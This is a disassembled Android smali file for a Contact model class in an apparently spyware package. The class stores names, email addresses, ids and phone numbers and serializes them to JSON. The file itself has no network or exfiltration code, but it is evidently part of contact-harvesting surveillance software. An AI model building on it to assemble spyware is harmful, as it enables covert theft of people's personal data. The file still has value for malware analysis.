.class public Landroid/spyware/model/Contact;
.super Ljava/lang/Object;
.source "Contact.java"


# instance fields
.field private display_name:Ljava/lang/String;

.field private email_addresses:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private id:J

.field private normalized_number:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;Ljava/util/List;JLjava/lang/String;)V
    .registers 7
    .param p1, "display_name"    # Ljava/lang/String;
    .param p3, "id"    # J
    .param p5, "normalized_number"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;J",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 35
    .local v3, "email_addresses":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-direct {v1}, Ljava/lang/Object;-><init>()V

    .line 36
    iput-object v2, v1, Landroid/spyware/model/Contact;->display_name:Ljava/lang/String;

    .line 37
    iput-object v3, v1, Landroid/spyware/model/Contact;->email_addresses:Ljava/util/List;

    .line 38
    iput-wide v4, v1, Landroid/spyware/model/Contact;->id:J

    .line 39
    iput-object v6, v1, Landroid/spyware/model/Contact;->normalized_number:Ljava/lang/String;

    .line 40
    return-void
.end method


# virtual methods
.method public toJSON()Lorg/json/JSONObject;
    .registers 7

    .prologue
    .line 43
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 46
    .local v0, "JSONContact":Lorg/json/JSONObject;
    :try_start_5
    const-string v2, "display_name"

    iget-object v3, v6, Landroid/spyware/model/Contact;->display_name:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 47
    const-string v2, "email_addresses"

    new-instance v3, Lorg/json/JSONArray;

    iget-object v4, v6, Landroid/spyware/model/Contact;->email_addresses:Ljava/util/List;

    invoke-direct {v3, v4}, Lorg/json/JSONArray;-><init>(Ljava/util/Collection;)V

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 48
    const-string v2, "id"

    iget-wide v4, v6, Landroid/spyware/model/Contact;->id:J

    invoke-virtual {v0, v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 49
    const-string v2, "normalized_number"

    iget-object v3, v6, Landroid/spyware/model/Contact;->normalized_number:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_26
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_26} :catch_27

    .line 54
    :goto_26
    return-object v0

    .line 50
    :catch_27
    move-exception v1

    .line 51
    .local v1, "ex":Lorg/json/JSONException;
    const-string v2, "::trace"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-class v4, Landroid/spyware/model/Contact;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "->toJSON:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static {v1}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_26
.end method
